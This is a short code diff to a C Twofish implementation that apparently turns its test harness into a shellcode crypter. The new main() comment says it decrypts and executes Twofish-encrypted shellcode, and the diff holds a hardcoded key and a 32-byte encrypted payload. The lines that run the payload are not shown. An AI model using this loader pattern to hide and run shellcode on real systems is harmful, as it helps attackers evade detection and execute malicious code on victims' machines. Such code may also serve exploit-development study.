@@ -289,9 +289,10 @@ void keySched(BYTE M[], int N, u32 **S, u32 K[40], int *k)
     }
 }	
 	
-/***********************************************************************
-  TESTING FUNCTIONS AND STUFF STARTS HERE
-***********************************************************************/
+/*
+ * The main function to decrypt and execute the Twofish-encrypted
+ * shellcode.
+ */
 int main()
 {
     u32 *S;
@@ -301,13 +302,13 @@ int main()
     int i = 0;
     int txt_size = 32;
     unsigned char key[] = "\x70\x6b\x74\x6d\x6f\x6e\x6b\x79"
-	  "\x34\x70\x72\x65\x7a\x31\x34\x21";
-/*    unsigned char text[] = "\x35\xc7\xe5\x76\x5c\x48\x22\xd6"
-           "\xc6\x2f\x01\xa7\x73\xf5\x40\xb0"
-           "\x49\xc8\xd3\x48\x20\x2e\xa4\x77"
-           "\x61\x28\x9b\xb4\x4d\x8a\xa6\x9f";
-*/
-    unsigned char text [] = "\x04\x33\x52\x66\xfc\x90\xa9\x1f\xad\xe6\x36\x0f\x6a\x34\xb5\x61\x7c\xf3\x56\xd8\x4f\x74\xf7\x76\x50\x91\x54\xb0\x70\x9e\x8e\x28";
+	"\x34\x70\x72\x65\x7a\x31\x34\x21";
+
+    unsigned char text [] = "\x04\x33\x52\x66\xfc\x90\xa9\x1f"
+	"\xad\xe6\x36\x0f\x6a\x34\xb5\x61"
+	"\x7c\xf3\x56\xd8\x4f\x74\xf7\x76"
+	"\x50\x91\x54\xb0\x70\x9e\x8e\x28";
+
     unsigned char *txt;
 
     keySched(key, 128, &S, K, &k);
